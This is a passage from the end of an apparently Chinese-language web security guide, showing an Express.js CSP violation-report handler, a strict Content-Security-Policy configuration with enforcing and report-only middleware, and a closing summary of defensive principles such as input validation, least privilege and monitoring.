    blockedUri: cspReport['blocked-uri'],
    violatedDirective: cspReport['violated-directive'],
    originalPolicy: cspReport['original-policy'],
    referrer: cspReport['referrer'],
    timestamp: new Date().toISOString()
  });

  // 可以发送到安全监控系统
  // await sendToSecuritySystem(cspReport);

  res.status(204).send();
});

// 严格的CSP配置示例（生产环境推荐）
const strictCSP = {
  // 最严格的策略：所有资源必须同源
  'default-src': ["'none'"],

  // 脚本：只允许同源
  'script-src': ["'self'"],

  // 样式：只允许同源，不允许内联
  'style-src': ["'self'"],

  // 图片：同源 + HTTPS图片
  'img-src': ["'self'", 'https:'],

  // 连接：只允许同源
  'connect-src': ["'self'"],

  // 字体：同源
  'font-src': ["'self'"],

  // 帧：禁止
  'frame-src': ["'none'"],

  // 对象：禁止
  'object-src': ["'none'"],

  // base-uri：限制
  'base-uri': ["'self'"],

  // 表单提交：只允许同源
  'form-action': ["'self'"],

  // 框架祖先：只允许同源
  'frame-ancestors': ["'self'"],

  // worker：只允许同源
  'worker-src': ["'self'"],

  // manifest：只允许同源
  'manifest-src': ["'self'"]
};

// 使用严格CSP（需要移除所有内联样式和脚本）
app.use((req, res, next) => {
  const cspHeader = generateCSPHeader(strictCSP);
  res.setHeader('Content-Security-Policy', cspHeader);
  next();
});

// Report-Only模式（不执行策略，只报告违规）
// 用于测试新策略而不影响功能
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy-Report-Only', generateCSPHeader(baseCSP));
  next();
});
```

---

## 总结

Web安全是一个需要持续关注和投入的领域。本指南涵盖了Web安全的主要方面，从前端安全到后端安全，从认证授权到HTTPS/TLS加密，以及渗透测试基础知识。

关键要点总结：

1. **纵深防御**：不要依赖单一安全措施，在各个环节都部署相应的防护。

2. **输入验证**：永远不要信任用户输入，对所有输入进行严格验证和转义。

3. **最小权限原则**：只授予完成任务所需的最小权限。

4. **安全是开发过程的一部分**：安全漏洞越早发现越好，将安全纳入开发流程。

5. **保持更新**：定期更新依赖库和系统，修补已知漏洞。

6. **日志与监控**：记录安全相关事件，建立有效的监控和响应机制。

7. **使用标准工具**：如Helmet.js、CSP、TLS 1.2/1.3等。

8. **持续学习**：安全威胁不断演进，需要持续关注新的安全动态和最佳实践。

通过本指南的学习和实践，你应该能够识别和防御常见的Web安全威胁，构建更加安全的Web应用。记住，安全不是一次性的工作，而是需要持续投入和改进的过程。
